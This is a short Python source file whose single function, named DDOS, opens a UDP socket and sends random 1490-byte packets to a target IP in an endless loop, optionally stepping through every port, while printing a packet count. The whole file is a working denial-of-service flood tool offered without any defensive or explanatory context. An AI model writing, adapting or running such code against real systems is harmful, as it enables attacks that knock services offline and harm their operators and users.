import socket, random

def DDOS(ip, port, fixed):
	sent = 0
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
		if fixed == False:
			port = port + 1
		print("Sent {} packet to {}:{}".format(sent, ip, port), end="\r")
		if port == 65534:
		  port = 1